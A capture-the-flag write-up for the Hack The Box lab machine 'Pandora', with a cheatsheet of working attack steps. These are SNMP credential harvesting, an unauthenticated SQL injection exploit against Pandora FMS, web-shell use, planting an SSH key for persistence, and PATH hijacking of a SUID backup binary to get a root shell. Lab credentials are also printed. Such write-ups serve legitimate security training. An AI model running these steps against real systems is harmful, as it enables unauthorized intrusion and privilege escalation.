---
description: suid vs sudo vs capabilities
---

# Pandora \[Easy]

## Report

FInd creds for user 'Daniel' via SNMP enumeration. Reading Apache config files, we see a vhost that only listens on local host, port forward to access it and it uses Pandora FMS whose version is vulnerable to unauthenticated SQLi to become admin. Upload PHP reverse shell and access file via uploads directory and become 'matt'

Access authorized\_keys and insert own key to use SSH. Matt can run a backup binary as SUID. It performs a backup of a particular directory using tar but does not call via full PATH. Create our own tar binary and become root

## Cheatsheet

```
snmpwalk -v 2c -c public 10.10.11.136

ssh daniel@10.10.11.136 -L 9001:localhost:80

python3 Pandora_v7.0NG.742_exploit_unauthenticated/sqlpwn.py -t 127.0.0.1:9001 
URL:  http://127.0.0.1:9001/pandora_console
[+] Admin Session Cookie : n3tfdo76hso6lgoj5dnpti0evk
[+] Pwned :)
[+] If you want manual Control : http://127.0.0.1:9001/pandora_console/images/pwn.php?test=
CMD > id
uid=1000(matt) gid=1000(matt) groups=1000(matt)

ssh-keygen -t rsa
chmod 700 ~/.ssh; chmod 600 ~/.ssh/id_rsa [kali]

/home/matt/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwSqsZSv+tqOsHc1XKNbvWe4at9Vn2LuuiQKNXF2Q69VBQXL0Cr60vXFXU1B+nWb8gvJvRbRc/VYkCFtmxBGFzVQNJ0WfOaXeyTTKlXmxEGPsAygufgEi0iB+rBcn5kuQUeipEsoIUoPUGVTrG3jvBoSQnRTz9Js2gM9RB9k2PMMpbO9nerA8LBCzarv1xcIDSsL7fHLi/43oZbpBT6AzUBgUc9yfp3YxpVX77rAzAlpSYyHj5qMBslIB1E5ZStn0JJ+I9fyEt/ncqGNr6YpguwTqq54LXVIUVOAx9VyE35yNkae0ytXsbLLk4izbs5jS3RspKNgjGhvJkLFIkPIqlK5TzdsTQ3/q2mkbHdPJsLdOuHoCNyKTCZW/Ke/yUvAOc1jSHMYjBz/4PWQyyO3oBkJFKfouHkWMENgKL/0v+wQvmnfp1XLJp862f8k3wf+mpSYU9z8QOlVm/8vI+4lqycF1E+pyzvUqYyJaHHv+tR7WYh7oAXQmGod20KdOCvN0= jtripz@kali" > authorized_keys
<h7oAXQmGod20KdOCvN0= jtripz@kali" > authorized_keys
chmod 700 .ssh
chmod 700 .ssh/authorized_keys

echo '/usr/bin/bash -p' > tar
chmod +x tar
export PATH=$PWD:$PATH
/usr/bin/pandora_backup
```

## Loot

### Creds

`daniel:HotelBabylon23`

`pandora:PandoraFMSSecurePass2021` MariaDB creds from include/config.php after revshell as matt

### Enum

```
snmp 161 udp
http 80 ssh 22

iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
"-u daniel -p HotelBabylon23"

netstat shows mysql 3306 (denied for daniel)

LinPEAS
╔══════════╣ Hostname, hosts and DNS
pandora                                                                                                                                                     
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb

127.0.1.1 pandora

just thought it was interesting

/etc/apache2/sites-enabled/000-default.conf

cat pandoradb.sql | mysql -u user -p -D history_db
pandora:PandoraFMSSecurePass2021 MariaDB creds from include/config.php after revshell as matt
```

### Proof

<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption><p>Hosts file used pandora.pandora.htb but here we see it use pandora.panda.htb</p></figcaption></figure>

{% embed url="https://mqt.gitbook.io/oscp-notes/ssh-keys" %}

The position of $ on PATH decides if it prepends or overwrites completely&#x20;

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
